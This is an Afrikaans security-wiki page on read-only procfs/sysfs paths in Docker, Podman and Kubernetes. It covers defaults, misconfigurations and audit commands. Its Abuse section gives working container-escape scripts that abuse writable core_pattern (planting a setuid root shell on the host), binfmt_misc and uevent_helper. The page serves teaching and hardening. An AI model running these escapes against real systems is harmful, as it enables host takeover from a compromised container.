# Lees-alleen stelselpaaie

{{#include ../../../../banners/hacktricks-training.md}}

Lees-alleen stelselpaaie is 'n afsonderlike beskerming van gemaskeerde paaie. In plaas daarvan om 'n paad heeltemal te verberg, maak die runtime dit sigbaar maar monteer dit as lees-alleen. Dit is algemeen vir sekere procfs- en sysfs-liggings waar lees-toegang aanvaarbaar of operasioneel nodig mag wees, maar skrywe te gevaarlik sou wees.

Die doel is eenvoudig: baie kernel-interface word baie meer gevaarlik wanneer hulle beskryfbaar is. 'n Lees-alleen-mount verwyder nie alle verkenningswaarde nie, maar dit voorkom dat 'n gekompromitteerde workload die onderliggende kernel-gekoppelde lêers via daardie paad wysig.

## Werking

Runtimes merk gereeld dele van die proc/sys-aansig as lees-alleen. Afhangend van die runtime en gasheer, kan dit paaie insluit soos:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Die werklike lys wissel, maar die model is dieselfde: laat sigbaarheid toe waar nodig, weier mutasie standaard.

## Laboratorium

Inspekteer die deur Docker verklaarde lees-alleen padlys:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspekteer die gemonteerde proc/sys-aansig van binne-in die container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

Slegs-lees stelselpaadjies beperk 'n groot klas misbruik wat die gasheer beïnvloed. Selfs wanneer 'n aanvaller procfs of sysfs kan inspekteer, verwyder die onvermoë om daar te skryf baie direkte modifikasiepaaie wat kernel tunables, crash handlers, module-loading helpers, of ander beheerkoppelvlakke betrek. Die blootstelling verdwyn nie, maar die oorgang van inligtingsvrystelling na gasheer-invloed word moeiliker.

## Misconfigurations

Die hooffoute is om sensitiewe paadjies te unmask of remount as lees-skryf, om gasheer proc/sys-inhoud direk bloot te stel met skryfbare bind mounts, of om privileged modes te gebruik wat effektief die veiliger runtime-standaarde omseil. In Kubernetes gaan `procMount: Unmasked` en privileged workloads dikwels saam met swakere proc-beskerming. Nog 'n algemene operasionele fout is om aan te neem dat omdat die runtime gewoonlik hierdie paadjies as slegs-lees monteer, alle workloads steeds daardie standaard erf.

## Abuse

As die beskerming swak is, begin deur te kyk na skryfbare proc/sys-inskrywings:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wanneer skryfbare inskrywings teenwoordig is, sluit waardevolle opvolgpaaie in:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Wat hierdie opdragte kan openbaar:

- Skryfbare entrië onder `/proc/sys` beteken dikwels dat die container die host kernel-gedrag kan wysig eerder as net dit te inspekteer.
- `core_pattern` is veral belangrik omdat 'n skryfbare host-facing waarde in 'n host code-execution pad verander kan word deur 'n proses te laat crash nadat 'n pipe handler gestel is.
- `modprobe` openbaar die helper wat die kernel gebruik vir module-loading verwante flows; dit is 'n waardevolle teiken wanneer dit skryfbaar is.
- `binfmt_misc` wys of aangepaste interpreter-registrasie moontlik is. As registrasie skryfbaar is, kan dit 'n execution primitive word in plaas van net 'n information leak.
- `panic_on_oom` beheer 'n host-wye kernel-besluit en kan dus hulpbron-uitputting in 'n host denial of service omskep.
- `uevent_helper` is een van die duidelikste voorbeelde van 'n skryfbare sysfs helper-pad wat host-context execution produseer.

Interessante gevindes sluit skryfbare host-facing proc-knoppies of sysfs-entrië in wat normaalweg slegs leesbaar moes wees. Op daardie punt het die workload verskuif van 'n beperkte container-uitsig na betekenisvolle kernel-invloed.

### Volledige Voorbeeld: `core_pattern` Host Escape

As `/proc/sys/kernel/core_pattern` van binne die container skryfbaar is en na die host kernel-uitsig wys, kan dit misbruik word om 'n payload uit te voer ná 'n crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
As die pad regtig die gasheer-kern bereik, word die payload op die gasheer uitgevoer en laat 'n setuid shell agter.

### Volledige Voorbeeld: `binfmt_misc` Registrasie

As `/proc/sys/fs/binfmt_misc/register` skryfbaar is, kan 'n pasgemaakte interpreter-registrasie code execution veroorsaak wanneer die ooreenstemmende lêer uitgevoer word:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Op 'n vir die host toeganklike skryfbare `binfmt_misc` lei dit tot kode-uitvoering in die deur die kernel aangeroep interpreter-pad.

### Volledige voorbeeld: `uevent_helper`

As `/sys/kernel/uevent_helper` skryfbaar is, kan die kernel 'n helper op die host-pad aanroep wanneer 'n ooreenstemmende gebeurtenis geaktiveer word:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Die rede waarom dit so gevaarlik is, is dat die helper path vanuit die host filesystem-perspektief opgelos word in plaas van vanuit 'n veilige container-only konteks.

## Kontroles

Hierdie kontroles bepaal of procfs/sysfs-eksponering op die verwagte plek read-only is, en of die workload steeds sensitiewe kernel interfaces kan wysig.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Wat hier interessant is:

- 'n normale geharde workload behoort baie min skryfbare /proc/sys inskrywings bloot te stel.
- Skryfbare /proc/sys-paaie is dikwels belangriker as gewone lees-toegang.
- As die runtime sê 'n pad is read-only maar dit in praktyk skryfbaar is, hersien mount propagation, bind mounts, en privilege settings noukeurig.

## Runtime-standaarde

| Runtime / platform | Standaardtoestand | Standaardgedrag | Algemene handmatige verslapping |
| --- | --- | --- | --- |
| Docker Engine | Aktief by verstek | Docker definieer 'n standaardlys van slegs-leesbare paaie vir sensitiewe /proc inskrywings | blootstelling van host /proc/sys mounts, `--privileged` |
| Podman | Aktief by verstek | Podman pas standaard slegs-leesbare paaie toe, tensy eksplisiet verslap | `--security-opt unmask=ALL`, uitgebreide host mounts, `--privileged` |
| Kubernetes | Erfst die runtime-standaarde | Gebruik die onderliggende runtime se slegs-leesbare padmodel tensy verswak deur Pod-instellings of host mounts | `procMount: Unmasked`, privileged workloads, skryfbare host /proc/sys mounts |
| containerd / CRI-O onder Kubernetes | Runtime-verstek | Gewoonlik staatmaak op OCI/runtime-standaarde | dieselfde as die Kubernetes-ry; direkte runtime-konfigurasiewijzigings kan die gedrag verswak |

Die kernpunt is dat slegs-leesbare stelselpaaie gewoonlik as 'n runtime-verstek teenwoordig is, maar maklik ondermyn kan word deur privileged modes of host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
